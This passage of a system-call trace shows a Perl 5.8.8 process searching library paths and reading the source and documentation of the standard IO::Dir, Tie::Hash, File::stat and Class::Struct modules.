${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
18439 12:54:35.918108 stat64("/etc/perl/Tie/Hash.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.918125 stat64("/etc/perl/Tie/Hash.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.918138 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.918151 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.918165 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.918178 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.918192 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.918204 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.918226 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.918239 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.918256 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.918269 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.918282 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.918295 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
18439 12:54:35.918317 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 9
18439 12:54:35.918332 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77d38) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.918343 _llseek(9, 0, [0], SEEK_CUR) = 0
18439 12:54:35.918367 read(9, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
18439 12:54:35.918685 read(9, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
18439 12:54:35.919241 read(9, "", 4096) = 0
18439 12:54:35.919257 close(9)          = 0
18439 12:54:35.919287 stat64("/etc/perl/File/stat.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.919302 stat64("/etc/perl/File/stat.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.919316 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.919328 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.919342 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.919354 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.919368 stat64("/usr/lib/perl5/File/stat.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.919380 stat64("/usr/lib/perl5/File/stat.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.919393 stat64("/usr/share/perl5/File/stat.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.919405 stat64("/usr/share/perl5/File/stat.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.919418 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.919431 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.919444 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.919457 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
18439 12:54:35.919478 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 9
18439 12:54:35.919492 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77d38) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.919504 _llseek(9, 0, [0], SEEK_CUR) = 0
18439 12:54:35.919520 read(9, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
18439 12:54:35.919982 stat64("/etc/perl/Class/Struct.pmc", 0xbff77b6c) = -1 ENOENT (No such file or directory)
18439 12:54:35.927218 stat64("/etc/perl/Class/Struct.pm", 0xbff77a7c) = -1 ENOENT (No such file or directory)
18439 12:54:35.927304 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbff77b6c) = -1 ENOENT (No such file or directory)
18439 12:54:35.927350 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbff77a7c) = -1 ENOENT (No such file or directory)
18439 12:54:35.927382 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbff77b6c) = -1 ENOENT (No such file or directory)
18439 12:54:35.927407 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbff77a7c) = -1 ENOENT (No such file or directory)
18439 12:54:35.927430 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbff77b6c) = -1 ENOENT (No such file or directory)
18439 12:54:35.927443 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbff77a7c) = -1 ENOENT (No such file or directory)
18439 12:54:35.927456 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbff77b6c) = -1 ENOENT (No such file or directory)
18439 12:54:35.927467 stat64("/usr/share/perl5/Class/Struct.pm", 0xbff77a7c) = -1 ENOENT (No such file or directory)
18439 12:54:35.927481 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbff77b6c) = -1 ENOENT (No such file or directory)
18439 12:54:35.927493 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbff77a7c) = -1 ENOENT (No such file or directory)
18439 12:54:35.927507 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbff77b6c) = -1 ENOENT (No such file or directory)
18439 12:54:35.927520 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
18439 12:54:35.927541 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
18439 12:54:35.927555 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77888) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.927567 _llseek(10, 0, [0], SEEK_CUR) = 0
18439 12:54:35.927586 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
18439 12:54:35.928017 brk(0x82de000)    = 0x82de000
18439 12:54:35.928420 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
18439 12:54:35.929027 _llseek(10, 6916, [6916], SEEK_SET) = 0
18439 12:54:35.929045 _llseek(10, 0, [6916], SEEK_CUR) = 0
18439 12:54:35.929056 close(10)         = 0
18439 12:54:35.929230 _llseek(9, 1334, [1334], SEEK_SET) = 0
18439 12:54:35.929270 _llseek(9, 0, [1334], SEEK_CUR) = 0
18439 12:54:35.929281 close(9)          = 0
18439 12:54:35.929912 brk(0x82ff000)    = 0x82ff000
18439 12:54:35.930059 _llseek(7, 2689, [2689], SEEK_SET) = 0
18439 12:54:35.930075 _llseek(7, 0, [2689], SEEK_CUR) = 0
18439 12:54:35.930086 close(7)          = 0
